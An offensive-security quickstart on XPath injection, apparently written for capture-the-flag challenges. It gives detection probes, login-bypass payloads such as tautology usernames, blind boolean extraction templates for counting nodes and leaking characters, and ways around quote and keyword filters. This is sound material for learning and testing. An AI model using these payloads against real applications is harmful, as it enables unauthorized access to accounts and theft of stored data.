# XPath Injection — Quickstart

XPath query languages (XPath 1.0/2.0/3.1) parse the same family of metacharacters as SQL: single quotes terminate string literals, predicates are bracketed `[...]`, and boolean expressions chain with `or`/`and`. Endpoints that interpolate user input into an XPath expression accept extra clauses the same way SQLi-vulnerable endpoints accept SQL fragments. Common in Java (XPathFactory), .NET (System.Xml.XPath), Node (xpath, xmldom), Python (lxml `etree.xpath`, `etree.XPath()`), and PHP (`SimpleXMLElement->xpath()`).

## Recognising the sink

| Source-side fingerprint | Vulnerable example |
|---|---|
| f-string / `.format()` building XPath | `tree.xpath(f"/users/user[name='{name}']")` |
| `+`-concat in Java/Node | `xpath.compile("//user[name='" + name + "']")` |
| `cssselect` translating user CSS | `tree.cssselect(user_css)` (CSS → XPath) |
| `pyquery` over user input | `pq.xpath(user_input)` |
| `defusedxml.lxml` + xpath | `defusedxml` only blocks XXE, not XPath injection |

The boolean response oracle is what makes the bug exploitable: HTTP response varies (success/failure JSON field, redirect vs render, distinct response length) based on whether the XPath returned a non-empty node-set.

## Detection

| Probe | Behavior on injectable | Notes |
|---|---|---|
| `'` or `"` | 500 / parser error / empty result | Confirms the quote is being interpolated |
| `' or '1'='1` | Returns ALL records | Tautology — same shape as SQLi |
| `' or '1'='1' or 'a'='b` | Returns ALL records | Trailing `or 'a'='b` pads the closing quote so the parser doesn't fail |
| `' or '1'='2' or 'a'='b` | Returns NO records | Confirms the boolean oracle direction |
| `') or ('1'='1` | Returns ALL records | When the original predicate uses `and ((...))` style |

Both confirmation probes succeed → injection confirmed and the boolean oracle is established. Without source you don't yet know the XPath structure, but the boolean oracle alone is enough to blind-extract.

## Authentication Bypass

Login flows often check `tree.xpath(f"/users/user[username='{u}' and password='{p}']")`. Inject:

- Username: `' or '1'='1` Password: `' or '1'='1` → matches all records, first one wins
- Username: `admin' or '1'='1' or '` Password: anything → matches admin (or first user starting with "admin")
- Username: `admin'] | //user[username='admin` Password: anything → returns the admin node specifically

## Blind Boolean Extraction

When the response is yes/no without leaking data, walk the XML tree character-by-character. The recipe parallels boolean SQLi but uses XPath's string functions:

### Step 1 — Count target nodes

```
' or count(//target_node) > N or 'a'='b
```

Binary-search `N` until the count is found. `//target_node` works without knowing the parent path; for unknown element names try `//*[contains(name(), "secret")]` or just `//*` and bisect by index.

### Step 2 — Per-node string length

```
' or string-length((//target_node)[i]) > N or 'a'='b
```

For each node `i ∈ [1..count]`, binary-search the length. Parenthesise the node-set selector before indexing — `(//target)[i]` not `//target[i]`.

### Step 3 — Per-character ASCII

```
' or substring((//target_node)[i], j, 1) > 'X' or 'a'='b
```

Binary-search the codepoint per character — ~7 requests per character for printable ASCII. XPath 2+ also supports `string-to-codepoints()`, but `substring(...) > 'X'` works on XPath 1.0 (lxml default) too.

Total cost: O(N × len × log(charset)) — for a 30-char flag across 2 nodes ≈ 350 requests.

### Step 4 — Element / attribute discovery

When you don't know the schema, enumerate names:

```
' or count(//*[name()=string-length((name(*[1])))]) > 0 or 'a'='b   # leak top-level name length
' or substring(name((//*)[i]), j, 1) > 'X' or 'a'='b                 # then char-by-char
' or substring((//*)[i]/@*[1], j, 1) > 'X' or 'a'='b                 # attributes
```

Or read the bundled XML schema offline if shipped with the source — much faster than blind enumeration.

## Filter / WAF Bypass

XPath has fewer filter triggers than SQL but a few common defences:

- Single-quote stripping: switch to `&apos;`-encoded payload, or use `concat()` to assemble the value: `concat('a','b','c')`.
- Keyword filtering of `or`/`and`: use `|` (union) — `'] | //user[1]='` returns the first user node directly.
- Bracket filtering: bare predicate-less probes still confirm injection — `' or 1=1 or '`.
- WAF that strips `'`: try `\'` (some XPath libraries unescape) or fall back to numeric predicates if any field is numeric.

## Anti-Patterns

- Trying SQLi-style comments (`--`, `#`, `/* */`) — XPath has no comment metacharacter; use the trailing-OR-pad pattern instead.
- Parallelising blind extraction against a Flask debug server backed by lxml — the dev server crashes under concurrent requests; serialise the extractor.
- Trusting flag-shaped strings in the bundled-source XML — challenge ZIPs often ship `f4k3_fl4g_*` placeholders for local testing; the real flag is injected at container start. Always extract from the live target.
- Calling `defusedxml` "safe" against XPath injection — it only blocks XXE / billion-laughs, not interpolation into XPath expressions.

## Cross-references

- LDAP filter manipulation (parallel grammar, parallel bypass shapes): [ldap-injection-quickstart.md](ldap-injection-quickstart.md).
- Boolean blind extraction in SQL (same algorithm, SQL grammar): [scenarios/sql/boolean-blind.md](scenarios/sql/boolean-blind.md).
- XXE (XML parser bug, separate root cause from XPath injection): [xxe-quickstart.md](xxe-quickstart.md).
